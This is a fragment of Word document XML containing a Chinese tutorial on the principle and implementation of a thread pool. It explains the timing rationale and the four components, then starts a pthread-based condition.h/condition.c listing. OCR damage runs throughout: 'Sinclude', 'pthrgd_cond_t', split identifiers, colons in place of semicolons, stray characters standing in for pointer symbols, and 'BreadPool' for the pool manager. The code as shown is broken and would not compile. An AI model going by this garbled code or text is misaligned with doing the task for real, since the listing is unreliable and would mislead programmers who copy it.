          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>线程池的原理及实现</w:t>
      </w:r>
      <w:bookmarkEnd w:id="164"/>
      <w:bookmarkEnd w:id="165"/>
      <w:bookmarkEnd w:id="166"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>多线程技术主要解决处理器单元内多个銭程执行的问题，它可以显著减少处理器单元 的闲置时间，増加处理器单元的呑吐能力。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>假设一个服务器完成一项任务所需时间为：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>创建线程时间，</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T2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在线程中执行任务的时间，</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T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>销毁线程时间。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Tl </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>远大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T2,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>则可以采用线程池，以提高服务器性能。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—个线程池包括以下四个基本组成部分：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="167" w:name="bookmark176"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="167"/>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线程池管理器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(BreadPool)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:用于创建并管理线程池，包括创建线程池，销毁线 程池，添加新任务；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="168" w:name="bookmark177"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="168"/>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工作线程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(PoolWorker)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:线程池中銭程，在没有任务时处于等待状态，可以循环 的执行任务；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="169" w:name="bookmark178"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="169"/>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任务接口</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Task)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:每个任务必须实现的接口，以供工作线程调度任务的执行，它 主要规定了任务的入口，任务执行完后的收尾工作，任务的执行状态等；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="765"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="170" w:name="bookmark179"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="170"/>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任务队列</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(taskQueue)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:用于存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>放没有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>处理的任务。提供一种緩冲机制。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线程池技术正是关注如何缩短或调整</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Tl, T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时间的技术，从而提高服务器程序性能的。 它把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Tl, T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分别安排在服务器程序的启动和结束的时间段或者一些空闲的时间段，这 样在服务器程序处理客户请求时，不会有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Tl, T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的开销了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线程池不仅调整</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Tl, T3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>产生的时间段,而且它还显著减少了创建线程的数目。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>代码实现：</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condition.h</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Sifndef _CQNDITIQN_H_</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Sdefine _CQNBITION_H_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sinclude &lt;pthread. h&gt;</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zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〃封</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>装一个互斥里和条件変里作为状态</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>typedef struct condition</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p thr e ad__mut ex_t pmutex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pthrgd_cond_t pcond;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>} condi t i on__t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对状态的操作函数</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int condition_init (condition_t *cond);</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condition_lock (condition_t *cond);</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condi tion_unlock(condi tion_t *cor.d);</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condition_wait (condition_t *cond);</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condi tion-timedwai t (condi tion_t *cond</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> const struct timespec *abstime);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int condition_signal (condition_t* cord)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">i nt condi ti on_br </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">adcast (condi ti on_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">凍 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cond)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i nt condi ti on_de stroy (condi ti on_t *cend)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#endif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition.c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include "condition.h”</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃初始化</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int condition_init(condition_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
